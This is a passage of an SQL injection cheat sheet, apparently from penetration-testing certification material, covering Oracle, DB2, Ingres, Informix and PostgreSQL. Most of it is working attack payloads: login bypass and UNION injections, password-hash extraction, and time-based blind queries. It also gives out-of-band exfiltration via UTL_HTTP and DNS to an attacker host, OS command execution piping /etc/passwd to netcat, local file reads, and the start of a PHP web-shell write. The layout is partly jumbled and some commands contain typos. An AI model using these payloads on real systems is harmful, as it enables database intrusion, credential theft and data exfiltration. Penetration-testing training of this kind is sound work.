+▪ SELECT username FROM all_users ORDER BY username;
+— This command obtains column ‘username’ from the table ‘all_users’
+List Users and sort it by username.
+▪ SELECT name FROM sys.user$;
+— This command obtains column ‘name’ from table ‘sys.user$’.
+▪ SELECT user FROM dual
+Current User
+— This command obtains current user from the table ‘dual’.
+▪ SELECT DISTINCT owner FROM all_tables;
+List all — This command lists schemas (one per user).
+Database — Also queries TNS listener for other databases.
+See tnscmd (services | status).
+This command is used to create database accounts
+▪ CREATE USER victor IDENTIFIED BY Pass123
+Create DB TEMPORARY TABLESPACE temp
+Accounts DEFAULT TABLESPACE users;
+GRANT CONNECT TO victor;
+GRANT RESOURCE TO victor;
+▪ SELECT global_name FROM global_name;
+— This command obtains current user from global_name.
+▪ SELECT name FROM v$database;
+Current — This command obtains current username from column ‘name’,
+Database present in the table ‘v$database’.
+▪ SELECT instance_name FROM v$instance;
+— This command obtains column ‘instance_name’ from the table
+‘v$instance’.
+Page | 19 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT SYS.DATABASE_NAME FROM DUAL;
+— This command obtains database name ‘SYS.DATABASE’ from the
+table ‘DUAL’.
+▪ SELECT table_name FROM all_tables;
+— This command obtains column ‘table_name’ from the table
+‘all_tables’.
+List Tables
+▪ SELECT owner, table_name FROM all_tables;
+— This command obtains columns ‘owner’ and ‘table_name’ from the
+table ‘all_tables’.
+▪ SELECT column_name FROM all_tab_columns WHERE table_name =
+‘blah’;
+— This command obtains column ‘column_name’ from the table
+‘all_tab_columns’ having value of ‘table_name’ as ‘blah’.
+Column
+▪ SELECT column_name FROM all_tab_columns WHERE table_name =
+Names
+‘blah’ and owner = ‘foo’
+— This command obtains column ‘column_name’ from the table
+‘all_tab_columns’ having value of ‘table_name’ as ‘blah’ and value of
+owner as ‘foo’.
+▪ SELECT username FROM (SELECT ROWNUM r, username FROM
+Select Nth
+all_users ORDER BY username) WHERE r=9;
+Row
+— This command retrieves 9th row (rows numbered from 1).
+Select Nth ▪ SELECT substr(‘abcd’, 3, 1) FROM dual;
+Char — This command retrieves gets 3rd character, ‘c’.
+▪ BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END
+IF; END;
+If Statement — If the condition is true then a time delay is triggered and if the
+condition is false time delay is not triggered.
+— This command does not work well for SELECT statements.
+▪ SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;
+Case — If the condition is true, it returns 1.
+Statement ▪ SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual;
+— If the condition is true, it returns 2.
+▪ SELECT 1 FROM dual
+— This command is used for writing a comment.
+Comments — NB: SELECT statements must have a FROM clause in Oracle so you
+have to use the dummy table name ‘dual’ when we’re not actually
+selecting from a table.
+Page | 20 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+String
+▪ SELECT CHR(75)||CHR(76)||CHR(77)
+without
+— This command returns ‘KLM’.
+Quotes
+▪ BEGIN DBMS_LOCK.SLEEP(5); END;
+— This command is used to trigger time delay.
+▪ SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual;
+— This command is used, if reverse looks are slow.
+Time Delay ▪ SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM
+dual;
+— This command is used, if forward lookups are slow.
+▪ SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+— This command is used, if outbound TCP is filtered / slow.
+There are some techniques for command execution.
+▪ Creating JAVA library
+Command
+▪ DBMS_SCHEDULER
+Execution
+▪ EXTPROC
+▪ PL/SQL native make utility (9i only)
+▪ SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
+Make DNS
+▪ SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
+Requests
+—These commands are used to make DNS request from dual.
+▪ SELECT header, txt FROM news UNION ALL SELECT name, pass FROM
+members
+— By using union, you can do SQL queries cross-table. Basically, you can
+Union poison query to return records from another table and this example will
+Injections combine results from both news table and members table and return all
+of them.
+▪ Another Example:
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+▪ DROP sampletable;--
+Username: admin'—
+Log in as SELECT * FROM members WHERE username = 'admin'--' AND
+Admin User password = 'password'
+—This command retrieves all the users from the table ‘members’ where
+username is ‘admin’ and password is ‘password’.
+Page | 21 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT name, password FROM sys.user$ where type#=1
+List
+—This command retrieves the columns ‘name’ and ‘password’ from
+Passwords
+table ‘sys.user$’ having ‘type#=1’.
+▪ SELECT name, password, astatus FROM sys.user$
+—This command retrieves the username and password hashes
+List
+— priv, <= 10g. a status tells you if acct is locked.
+Password
+▪ SELECT name,spare4 FROM sys.user$
+Hashes
+—This command retrieves the username and password hashes
+— priv, 11g
+▪ CREATE USER
+▪ user IDENTIFIED by pass;
+Create Users
+— This command creates a user ‘USER’ who authenticates by pass to
+log on to the database.
+▪ DROP USER
+Drop User
+— This command drops a ‘USER’.
+Make User ▪ GRANT DBA to USER
+DBA — This command grants DBA privilege to ‘USER’.
+▪ UTL_FILE can sometimes be used. Check that the following is non-null:
+Local File SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
+Access Java can be used to read and write files if it’s installed (it is not available
+in Oracle Express).
+▪ SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT host_name FROM v$instance;
+Hostname, SELECT UTL_INADDR.get_host_address FROM dual;
+IP Address — This command obtains IP address of the user.
+▪ SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual;
+— This command obtains the hostnames of the user.
+Error Based
+▪ (utl_inaddr.get_host_address((select user from DUAL)));
+SQLi Attack:
+— This command is used for accepting integer inputs.
+To throw
+▪ ' + (utl_inaddr.get_host_address((select user from DUAL)))+';
+Conversion
+— This command is used for accepting string inputs.
+Errors
+Clear SQLi
+Tests: ▪ product.asp?id=4
+For Boolean ▪ product.asp?id=5-1
+SQL ▪ product.asp?id=4 OR 1=1
+Injection — These commands can be used as tests for Boolean SQL injection and
+and Silent silent attacks.
+Attacks
+Page | 22 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ ?vulnerableParam=(SELECT CASE WHEN
+(NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN
+Time Based dbms_pipe.receive_message(('xyz'),14) ELSE
+SQLi dbms_pipe.receive_message(('xyz'),1) END FROM dual);
+Exploitation {INJECTION} = You want to run the query.
+— If the condition is true, will response after 14 seconds. If is false, will
+be delayed for one second.
+▪ ?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/
+sniff.php?sniff='||({INJECTION})||'') FROM DUAL);
+— Using this command, sniffer application will save results.
+▪ ?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/
+'||({INJECTION})||'.html') FROM DUAL);
+— Using this command, results will be saved in HTTP access logs
+▪ ?vulnerableParam=(SELECT
+UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM
+Out of Band
+DUAL);
+Channel
+— Using this command, you can sniff DNS resolution requests to
+yourhost.com
+▪ ?vulnerableParam=(SELECT
+SYS.DBMS_LDAP.INIT(({INJECTION})||’.yourhost.com’,80) FROM
+DUAL);
+— Using this command, you can sniff DNS resolution requests to
+yourhost.com
+— {INJECTION} = You want to run the query.
+Default ▪ SYSTEM
+Databases ▪ SYSAUX
+Path of DB ▪ SELECT name FROM V$DATAFILE
+Files ▪ SELECT * FROM dba_directories
+▪ SELECT name FROM V$DATAFILE;
+Location of
+— This command retrieves the location of name data file from
+DB Files
+database ‘V$DATAFILE’.
+Page | 23 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT * FROM session_privs;
+— This command returns the privileges assigned to the current user.
+▪ SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;
+— This command returns a list of user’s privileges from dba_sys_privs
+having grantee value ‘DBSNMP’.
+Privileges ▪ SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY
+DICTIONARY’;
+— This command returns the users with a particular privilege.
+▪ SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
+— This command returns the column GRANTEE and GRANTED_ROLE
+from the table DBA_ROLE_PRIVS.
+▪ SELECT synonym_name, table_owner, table_name FROM
+List all_synonyms;
+Synonyms — Lists all synonyms available in the database, along with their
+corresponding table owners and table names.
+Determine
+▪ SELECT * FROM nls_database_parameters WHERE parameter =
+Database
+'NLS_CHARACTERSET';
+Character
+— Retrieves the character set used by the database.
+Set
+List
+▪ SELECT db_link, username, host FROM dba_db_links;
+Database
+— Lists all the database links configured in the database.
+Links
+▪ SELECT sid, serial#, username, status FROM v$session WHERE
+Find Active
+username IS NOT NULL;
+Sessions
+— Retrieves information about active user sessions.
+4. IBM-DB2 SQL Database
+Query Command
+▪ SELECT service_level FROM table(sysproc.env_get_inst_info()) as
+instanceinfo
+— This command returns a version of system table.
+▪ SELECT getvariable('sysibm.version') FROM sysibm.sysdummy1 --
+Version
+(v8+)
+— This command returns an information on built version of system
+table.
+Page | 24 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT prod_release, installed_prod_fullname FROM
+table(sysproc.env_get_prod_info()) as productinfo
+— This command returns release and full name information of system
+table.
+▪ SELECT service_level, bld_level FORM sysibmadm.env_inst_info
+— This command returns the service and configuration information of
+system table.
+DB2 uses OS accounts. Those with DB2 access can be retrieved with:
+▪ SELECT distinct(authid) FROM sysibmadm.privileges
+— This command retrieves distinct authorization ID of users from
+sysibmadm.privileges.
+▪ SELECT grantee FROM syscat.dbauth
+— This command lists the users with database privileges.
+List Users
+▪ SELECT distinct(definer) FROM syscat.schemata
+— This command retrieves distinct authorization ID of the owner of
+the schema.
+▪ SELECT distinct(grantee) FROM sysibm.systabauth
+— This command retrieves distinct authorization ID of users having
+database privileges from sysibm.systabauth.
+▪ SELECT user FROM sysibm.sysdummy1;
+— This command obtains current user from the table
+sysibm.sysdummy1.
+▪ SELECT session_user FROM sysibm.sysdummy1;
+Current User — This command obtains current session user from the table
+‘sysibm.sysdummy1.
+▪ SELECT system_user FROM sysibm.sysdummy1;
+— This command obtains current system user from the table
+‘sysibm.sysdummy1.
+▪ SELECT schemaname FROM syscat.schemata;
+List all
+—This command obtains a column name ‘schemaname’ having a list of
+Database
+databases from the table ‘syscat.schemata’.
+▪ SELECT current server from sysibm.sysdummy1;
+Current
+— This command obtains the current database server from
+Database
+sysibm.sysdummy1.
+▪ SELECT table_name FROM sysibm.tables;
+List Tables — This command obtains the list ‘table_name’ from table
+sysibm.tables.
+Page | 25 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT name FROM sysibm.systables;
+— This command obtains the list ‘name’ from table sysibm.systables.
+▪ SELECT name, tbname, coltype FROM sysibm.syscolumns;
+Column — This command obtains the column names- ‘name’, ‘tbname’ and
+Names ‘coltype’ from table sysibm.syscolumns.
+— syscat and sysstat and can also be used in place of sysibm.
+▪ SELECT name from (SELECT name FROM sysibm.systables order by
+Select Nth
+name fetch first N+M-1 rows only) sq order by name desc;
+Row
+— This command returns first N rows only from sysibm.systables.
+Select Nth ▪ SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1;
+Char — This command returns b.
+If Statement ▪ Seems only allowed in stored procedures. Use case logic instead.
+▪ SELECT CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB'
+Case
+END FROM sysibm.sysdummy1
+Statement
+— If the condition is true, 'AAAAAAAAAA' is returned.
+▪ select blah from foo;
+Comments
+— This command is used for writing a comment.
+▪ SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
+String
+-- returns “ADRI”.
+without
+— This command returns a string without quotes.
+Quotes
+— It can be used without select.
+▪ Heavy queries, for example:
+' and (SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2,
+sysibm.columns t3)>0 and (SELECT ascii(substr(user,1,1)) FROM
+Time Delay sysibm.sysdummy1)=68;
+— If user starts with ASCII 68 ('D'), the heavy query will be executed,
+delaying the response. However, if user doesn’t start with ASCII 68, the
+heavy query won’t execute and thus the response will be faster.
+Command
+▪ This functionality is allowed from procedures or UDFs.
+Execution
+List Password
+▪ N/A (OS User Accounts)
+Hashes
+Page | 26 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT distinct(grantee) FROM sysibm.systabauth where
+List DBA CONTROLAUTH='Y';
+Accounts — This command returns a list of DBA accounts from table
+sysibm.systabauth having CONTROLAUTH value ‘Y’.
+Local File
+▪ This functionality is available through stored procedures or DB2 tool.
+Access
+▪ SELECT os_name,os_version,os_release,host_name FROM
+Hostname, IP sysibmadm.env_sys_info;
+Address — This command obtains the Hostname, and IP address of a system
+from sysibmadm.env_sys_info.
+▪ SELECT xmlagg(xmlrow(table_schema)) FROM sysibm.tables;
+— This command returns all in one xml-formatted string.
+▪ SELECT xmlagg(xmlrow(table_schema)) FROM (SELECT
+distinct(table_schema) FROM sysibm.tables);
+Serialize XML: — This command returns all in one xml-formatted string excluding
+For Error redundant elements.
+Based ▪ SELECT xml2clob(xmelement(name t, table_schema)) FROM
+sysibm.tables;
+— This command returns all in one xml-formatted string (v8).
+▪ CAST(xml2clob(… AS varchar(500));
+— This command is used to display the result.
+▪ SYSIBM
+▪ SYSCAT
+Default ▪ SYSSTAT
+Databases ▪ SYSPUBLIC
+▪ SYSIBMADM
+▪ SYSTOOLS
+▪ SELECT * FROM sysibmadm.reg_variables WHERE
+Location of
+reg_var_name='DB2PATH';
+DB Files
+— This command obtains the location of DB files.
+▪ select * from syscat.tabauth;
+— This command obtains all the users having privileges on a particular
+table or view in the database
+Privileges
+▪ select * from syscat.dbauth where grantee = current user;
+— This command obtains the current user having privileges on a
+particular table or view in the database.
+Page | 27 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ select * from syscat.tabauth where grantee = current user;
+— This command obtains the current user having table and view
+privileges.
+▪ select * from SYSIBM.SYSUSERAUTH;
+— This command lists the users with system privileges.
+List System
+▪ select tabname from syscat.tables where type = 'S';
+Catalog
+— Lists all system catalog tables in the database.
+Tables
+Current Lock ▪ select * from sysibmadm.locks;
+Information — Displays current lock information in the database.
+List Buffer ▪ select bpname from syscat.bufferpools;
+Pools — Lists all the buffer pools configured in the database.
+List Table ▪ select tbspname from syscat.tablespaces;
+Spaces — Lists all the table spaces in the database.
+5. Ingres SQL Database
+Query Command
+▪ SELECT dbmsinfo('_version');
+Version — This command retrieves the system information of the current
+installation of SQL Database.
+First connect to iidbdb, then
+▪ SELECT name, password FROM iiuser;
+— This command retrieves the columns ‘name’ and ‘password’ from
+List Users
+the table ‘iiuser’.
+▪ SELECT own FROM iidatabase;
+— This command lists the names of users from the table ‘iidatabase’.
+▪ select dbmsinfo(‘session_user’);
+Current User ▪ select dbmsinfo(‘system_user’);
+— These commands return the user id of the current user.
+▪ SELECT name FROM iidatabase;
+List all
+—This command obtains a column name ‘name’ having a list of
+Database
+databases from the table ‘iidatabase’.
+Page | 28 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Current ▪ select dbmsinfo(‘database’);
+Database — This command obtains the current SQL database.
+▪ SELECT table_name, table_owner FROM iitables;
+— This command obtains the columns ‘table_name’ and ‘table_owner’
+from the table ‘iitables’.
+▪ SELECT relid, relowner, relloc FROM iirelation;
+— This command obtains the columns ‘relid’, ‘relowner’ and ‘relloc’
+List Tables
+from the table ‘iirelation’.
+▪ SELECT relid, relowner, relloc FROM iirelation WHERE relowner !=
+'$ingres';
+— This command obtains the columns ‘relid’, ‘relowner’ and ‘relloc’
+from the table ‘iirelation’ having ‘relowner’ value as !=’$ingres’.
+▪ SELECT column_name, column_datatype, table_name, table_owner
+FROM iicolumns;
+List Column
+— This command lists columns ‘column_name’, ‘column_datatype’,
+‘table_name’ and ‘table_owner’ from the table ‘iicolumns’.
+▪ This functionality is not possible, but following command can be used
+Select Nth to some extent:
+Row ▪ get:select top 10 blah from table;
+— This command obtains first 10 blah form table.
+Select Nth ▪ select substr(‘abc’, 2, 1);
+Char — This command returns ‘b’.
+▪ SELECT 123;
+— This command is used for writing a comment.
+Comments
+▪ SELECT 123; /* comment */
+— This command is used to comment out a statement.
+List ▪ First connect to iidbdb, then:
+Password select name, password from iiuser;
+Hashes — This command obtains password hashes from table ‘iiuser’.
+Hostname, IP ▪ SELECT dbmsinfo(‘ima_server’)
+Address — This command obtains the Hostname and IP address of a system.
+▪ $ su - ingres
+Logging in
+from $ sql iidbdb
+Command * select dbmsinfo(‘_version’); go
+Line — This command can be used to log in from command line.
+Page | 29 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Default ▪ SELECT name FROM iidatabase WHERE own = '$ingres';
+Databases — This command lists the databases from ‘iidatabase’.
+▪ SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE
+name = ‘value’;
+— This command obtains primary location of db.
+Location of
+▪ SELECT lname FROM iiextend WHERE dname = ‘value’;
+DB Files
+— This command obtains extended location of db.
+▪ SELECT are FROM iilocations where lname = ‘value’;
+— This command obtains all area (i.e. directory) linked with a location.
+▪ SELECT dbmsinfo('db_admin');
+— This command retrieves the users with ‘db_admin’ privilege.
+▪ SELECT dbmsinfo('create_table');
+— This command retrieves the users with 'create_table' privilege.
+▪ SELECT dbmsinfo('create_procedure');
+— This command retrieves the users with 'create_procedure' privilege.
+▪ SELECT dbmsinfo('security_priv');
+Privileges — This command retrieves the users with 'security_priv' privilege.
+▪ SELECT dbmsinfo('SELECT_syscat');
+— This command retrieves the users with 'SELECT_syscat' privilege.
+▪ SELECT dbmsinfo('db_privileges');
+— This command retrieves the users with 'db_privileges' privilege.
+▪ SELECT dbmsinfo('current_priv_mask');
+— This command retrieves the users with 'current_priv_mask'
+privilege.
+▪ SELECT role_name FROM iiroles;
+List Roles
+— Lists all the roles defined in the database.
+List Active ▪ SELECT * FROM iisessions;
+Sessions — Displays information about active sessions.
+▪ SELECT server_class, node, listen_address FROM iinodes;
+Find Ingres
+— Lists Ingres Net servers along with their nodes and listening
+Net Servers
+addresses.
+List Access ▪ SELECT table_name, privilege FROM iiaccess;
+Privileges — Displays access privileges on tables.
+Page | 30 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+6. Informix SQL Database
+Query Command
+▪ SELECT DBINFO('version', 'full') FROM systables WHERE tabid = 1;
+— This command retrieves the version and complete information from
+the table ‘systables’ having tabid value as ‘1’.
+▪ SELECT DBINFO('version', 'server-type') FROM systables WHERE tabid
+= 1;
+— This command retrieves the version and server information from the
+table ‘systables’ having tabid value as ‘1’.
+Version
+▪ SELECT DBINFO('version', 'major'), DBINFO('version', 'minor'),
+DBINFO('version', 'level') FROM systables WHERE tabid = 1;
+— This command retrieves the version, major and minor information
+from the table ‘systables’ having tabid value as ‘1’.
+▪ SELECT DBINFO('version', 'os') FROM systables WHERE tabid = 1;
+— This command retrieves the version and OS information from the
+table ‘systables’ having tabid value as ‘1’.
+▪ SELECT username, usertype, password from sysusers;
+List Users — This command lists the usernames, usertype and password from the
+table sysusers.
+▪ SELECT USER FROM systables WHERE tabid = 1;
+— This command obtains the column ‘USER’ from table ‘systables’
+having tabid value as ‘1’.
+Current User
+▪ SELECT CURRENT_ROLE FROM systables WHERE tabid = 1;
+— This command obtains the column ‘CURRENT_ROLE’ from table
+‘systables’ having tabid value as ‘1’.
+▪ SELECT name, owner from sysdatabases;
+List all
+— This command obtains the list of all the databases from the
+Database
+database ‘sysdatabases’.
+▪ SELECT DBSERVERNAME FROM systables where tabid = 1;
+Current
+— This command obtains the column ‘DBSERVERNAME’ current server
+Database
+name from table ‘systable’ having tabid value as ‘1’.
+▪ SELECT tabname, owner FROM systables;
+List Tables — This command obtains the columns ‘tabname’ and ‘owner’ from
+table ‘systable’.
+Page | 31 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT tabname, viewtext FROM sysviews JOIN systables ON
+systables.tabid = sysviews.tabid;
+— This command selects columns ‘tabname’ and ‘viewtext’ from the
+table ‘sysviews’ and joins with the same columns of table ‘systables’,
+condition being ‘systables.tabid=sysviews.tabid’.
+▪ SELECT tabname, colname, owner, coltype FROM syscolumns JOIN
+systables ON syscolumns.tabid = systables.tabid;
+List Columns — This command selects columns ‘tabname’, ‘colname’, ‘owner’, and
+‘coltype’ from the table ‘syscolumns’ and joins with the same columns
+of table ‘systables’, condition being ‘syscolumns.tabid=systables.tabid’.
+▪ SELECT first 1 tabid from (select first 10 tabid from systables order by
+Select Nth
+tabid) as sq order by tabid desc;
+Row
+— This command retrieves the 10th row.
+▪ SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where
+Select Nth
+tabid = 1;
+Char
+— This command returns ‘C’.
+▪ SELECT tabid, case when tabid>10 then “High” else ‘Low’ end from
+Case systables;
+Statement — This command returns “High” for columns ‘tabid’ and ‘case’, if tabid
+is greater than 10 else returns “Low”.
+▪ select 1 FROM systables WHERE tabid = 1;
+Comments
+— This command is used for writing a comment.
+▪ SELECT DBINFO(‘dbhostname’) FROM systables WHERE tabid = 1;
+Hostname, IP
+— This command returns hostname and IP address information from
+Address
+table ‘systables’ having tabid value as ‘1’.
+These are the system databases:
+▪ sysmaster
+Default
+▪ ysadmin*
+Databases
+▪ ysuser*
+▪ ysutils*
+▪ SELECT tabname, grantor, grantee, tabauth FROM systabauth join
+systables on systables.tabid = systabauth.tabid;
+— This command is used to find out that which user has access to
+which table.
+Privileges
+▪ SELECT procname, owner, grantor, grantee from sysprocauth join
+sysprocedures on sysprocauth.procid = sysprocedures.procid;
+— This command is used to find out that which user has access to
+which procedures.
+Page | 32 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Find Chunk ▪ SELECT chunknum, pathname FROM syschunks;
+Information — Lists chunk numbers and their corresponding file paths.
+▪ SELECT dbsname, tabname, extent_size FROM sysextents;
+List Extents
+— Lists extents in the database along with their sizes.
+▪ SELECT name, fpage FROM syslogfil;
+List Onspaces
+— Lists onspaces and their first pages.
+Find
+▪ SELECT tabname, partn FROM sysfragments;
+Fragmented
+— Lists tables that are fragmented.
+Tables
+7. Postgre SQL Database
+Query Command
+▪ SELECT version();
+Version — This command obtains the version and built information of a
+database.
+▪ SELECT usename FROM pg_user;
+List Users — This command obtains the column ‘usename’ from the table
+‘pg_user’.
+Create DB This command is used to create database accounts
+Accounts ▪ CREATE USER victor WITH PASSWORD 'pass123'
+▪ SELECT user;
+— This command obtains a name of recently logged in user.
+▪ SELECT current_user;
+— This command obtains a name of current user.
+▪ SELECT session_user;
+Current User
+— This command obtains a name of current session user.
+▪ SELECT usename FROM pg_user;
+— This command obtains the column ‘usename’ from table ‘pg_user’.
+▪ SELECT getpgusername();
+— This command obtains the user name in current session.
+▪ SELECT datname FROM pg_database;
+List all
+— This command obtains the list of database in column ‘datname’
+Database
+from table ‘pg_database’.
+Page | 33 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Current ▪ SELECT current_database();
+Database — This command obtains the current database.
+▪ SELECT pg_read_file('global/pg_hba.conf',0,10000000);
+Load File — This command is used to read only the content of the DATA
+directory.
+▪ SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
+pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE
+List Tables c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’)
+AND pg_catalog.pg_table_is_visible(c.oid);
+— This command lists the tables present in the database.
+▪ SELECT relname, A.attname FROM pg_class C, pg_namespace N,
+pg_attribute A, pg_type T WHERE (C.relkind=’r') AND
+(N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND
+List Columns
+(A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped)
+AND (N.nspname ILIKE ‘public’);
+— This command lists the columns present in the database.
+▪ SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET
+0;
+Select Nth — This command returns rows numbered from 0.
+Row ▪ SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET
+1;
+— This command returns rows numbered from 1.
+Select Nth ▪ SELECT substr(‘abcd’, 3, 1);
+Char — This command returns c.
+▪ IF statements only seem valid inside functions, therefore they are of
+If Statement less use in SQL injection statement.
+▪ See CASE statement instead.
+Case ▪ SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
+Statement — This command returns A.
+▪ SELECT 1;
+— This command is used for writing a comment.
+Comments
+▪ SELECT /*comment*/1;
+— This command is used to comment out a statement.
+String without ▪ SELECT (CHAR(75)||CHAR(76)||CHAR(77))
+Quotes — This command will return ‘KLM’.
+Page | 34 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT pg_sleep(10);
+— This command triggers a measurable sleep time.
+— In postgres is 8.2+ only.
+Time Delay
+▪ CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS
+‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10);
+— This command is to create your own sleep function.
+▪ CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS
+Command ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — priv
+Execution ▪ SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′);
+— This commands run as postgres/pgsql OS-level user.
+▪ Generally, not it is not applicable in postgres. However,
+if contrib/dblinkis installed (it isn’t by default) it can be used to
+resolve hostnames (assuming you have DBA rights):
+▪ SELECT * FROM dblink('host=put.your.hostname.here
+Make DNS
+user=someuser dbname=somedb', 'SELECT version()') RETURNS
+Requests
+(result TEXT);
+Alternatively, if you have DBA rights you could run an OS-level
+command (see below) to resolve hostnames, e.g. “ping
+pentestmonkey.net”.
+▪ You should add “host” record to the pg_hba.conf file located in the
+Remote
+DATA directory.
+Authentication
+host all all 192.168.20.0/24 md5;
+▪ SELECT pg_read_file('global/pg_auth',0,10000000);
+List Passwords
+— This command lists passwords from a given database.
+▪ SELECT usename, passwd FROM pg_shadow;
+List Password
+— This command is used obtain password hashes from a given
+Hashes
+database.
+▪ To read data from local files, first you should create a temporary file
+for that. Read file contents into this table, then read the data from
+table.
+CREATE TABLE temptable(t text);
+COPY temptable FROM 'c:/boot.ini';
+Bulk Insert
+SELECT * FROM temptable LIMIT 1 OFFSET 0
+This functionality needs permissions for the service user who has
+been running database service. On default, it is not possible to read
+local files on Windows systems because postgres user doesn’t have
+read permissions.
+Page | 35 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ Drop the temporary file after exploitation.
+DROP TABLE temptable;
+▪ CREATE USER test1 PASSWORD ‘pass1';
+— This command creates a user name ‘USER test1’ having password
+‘pass1’.
+Create Users
+▪ CREATE USER test1 PASSWORD ‘pass1' CREATEUSER;
+— This command creates a user name ‘USER test1’ having password
+‘pass1’ and at the same time privileges are granted the user.
+▪ DROP USER test1;
+Drop User
+— This command drops user name ‘USER test1’.
+List DBA ▪ SELECT usename FROM pg_user WHERE usesuper IS TRUE
+Accounts — This command obtains a list of user names with DBA privileges.
+Make User ▪ ALTER USER test1 CREATEUSER CREATEDB;
+DBA — This command grants DBA privileges to a user name ‘USER test1’.
+▪ CREATE TABLE mydata(t text);
+COPY mydata FROM ‘/etc/passwd’;
+— priv, can read files which are readable by postgres OS-level user
+▪ …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1;
+— This command gets data back one row at a time.
+▪ …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2;
+— This command gets data back one row at a time.
+Local File
+▪ DROP TABLE mytest mytest;Write to a file:
+Access
+— This command drops a table and then write it to another text file.
+▪ CREATE TABLE mytable (mycol text);
+INSERT INTO mytable(mycol) VALUES (‘<? pasthru($_GET[cmd]); ?>’);
